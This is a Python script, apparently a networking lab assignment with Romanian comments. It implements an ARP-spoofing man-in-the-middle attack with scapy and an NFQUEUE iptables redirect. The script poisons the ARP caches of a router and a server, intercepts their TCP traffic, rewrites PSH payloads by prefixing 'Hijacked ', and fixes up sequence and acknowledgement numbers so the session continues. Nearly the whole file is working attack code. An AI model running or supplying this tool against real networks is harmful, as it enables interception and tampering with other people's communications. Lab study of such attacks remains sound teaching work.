#inspiratie:
#https://github.com/davidlares/arp-spoofing
#https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
#https://thepythoncode.com/article/building-arp-spoofer-using-scapy

import scapy.all as scapy
import threading
import time
from netfilterqueue import NetfilterQueue
import os

dict_seq = dict()
dict_ack = dict()

def get_mac(ip):
    """
    Functie care preia adresa MAC de la o adresa IP data
    Trimite ARP request la target IP si preia raspunsurile ca sa extraga adresa MAC.
    """
    # cream un request ARP pentru IP ul target
    request = scapy.ARP(pdst=ip)
    # cream un Ethernet frame cu destinatie broadcast
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # combinam pachetele
    final_packet = broadcast / request
    # trimitem pachetul si primim raspunsul
    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
    # extragem adresa MAC din raspuns
    mac = answer[0][1].hwsrc
    return mac
def spoof(target_ip, spoof_ip):
    """
    Functie care trimite un raspuns spoofed
    Pacaleste victima sa creada ca spoof_ip e adresa MAC a middle
    """
    # preluam adresa MAC a tintei
    target_mac = get_mac(target_ip)
    # cream un pachet ARP 
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send the packet
    scapy.send(packet, verbose=False)
    print(f"[INFO] Sent spoofed ARP packet: {spoof_ip} is-at {target_mac} to {target_ip}")
def restore(target_ip, source_ip):
    # luam adresele MAC reale
    target_mac = get_mac(target_ip) 
    source_mac = get_mac(source_ip)
    # cream pachet cu adresele MAC corecte
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    # trimitem pachetul de mai multe ori ca sa fim siguri ca tabelul ARP e actualizat
    scapy.send(packet, count=5, verbose=False)
    print(f"[INFO] Restored ARP table for {target_ip}, {source_ip} is-at {source_mac}")

def spoof_and_sniff():
    while True:
        spoof("198.7.0.1", "198.7.0.2")  # ruterul crede ca middle e serverul
        spoof("198.7.0.2", "198.7.0.1")  # serverul crede ca middle e ruterul
        time.sleep(5)

def process_packet(packet):
    global dict_ack
    global dict_seq
    payload = packet.get_payload()
    pkt = scapy.IP(payload)
    print(f"Processing the packet:{packet}")
    #verificam ca pachetul ca sursa pachetului sa fie ori din router ori din server si daca pachetul are layerul tcp
    if (pkt[scapy.IP].src == "198.7.0.1" or pkt[scapy.IP].src == "198.7.0.2") and pkt.haslayer(scapy.TCP):
        tcp_flags = pkt[scapy.TCP].flags
        original_seq = pkt[scapy.TCP].seq 
        original_ack = pkt[scapy.TCP].ack 
        # verificam daca original_seq e deja in dictionar
        if original_seq in dict_seq:
            new_seq = dict_seq[original_seq]
        else:
            new_seq = original_seq
        # aceeasi verificare si pentru ack
        if original_ack in dict_ack:
            new_ack = dict_ack[original_ack]
        else:
            new_ack = original_ack
            
        payload_data = pkt[scapy.TCP].payload

        if tcp_flags & 0x08 != 0: #verificam ca flagul psh sa fie in flagurile tcp-ului pachetului
            payload_prefix = 'Hijacked '.encode('ascii')
            payload_data = scapy.packet.Raw(payload_prefix + bytes(pkt[scapy.TCP].payload))
            
        dict_seq[original_seq + len(pkt[scapy.TCP].payload)] = new_seq + len(payload_data)
        dict_ack[new_seq + len(payload_data)] = original_seq + len(pkt[scapy.TCP].payload)

        # cream layerul IP nou
        ip_layer = scapy.IP()
        ip_layer.src = pkt[scapy.IP].src
        ip_layer.dst = pkt[scapy.IP].dst

        # cream layer ul tcp
        tcp_layer = scapy.TCP()
        tcp_layer.sport = pkt[scapy.TCP].sport
        tcp_layer.dport = pkt[scapy.TCP].dport
        tcp_layer.seq = new_seq
        tcp_layer.ack = new_ack
        tcp_layer.flags = pkt[scapy.TCP].flags

        # combinam layerele si adaugam noul payload
        new_packet = ip_layer / tcp_layer / payload_data
        print("The packet was successfully modified!")

        scapy.send(new_packet)
    else:
    #daca nu are layer tcp il trimitem inapoi asa cum e 
        scapy.send(pkt)


def start_queue():
    queue = NetfilterQueue()
    try:
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
        queue.bind(10, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        queue.unbind()

def main():
    try:
        thread_spoof = threading.Thread(target=spoof_and_sniff)
        thread_queue = threading.Thread(target=start_queue)

        thread_spoof.start()
        thread_queue.start()

        thread_spoof.join()
        thread_queue.join()
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring ARP tables...")
        restore("198.7.0.1", "198.7.0.2")
        restore("198.7.0.2", "198.7.0.1")

if __name__ == "__main__":
    main()
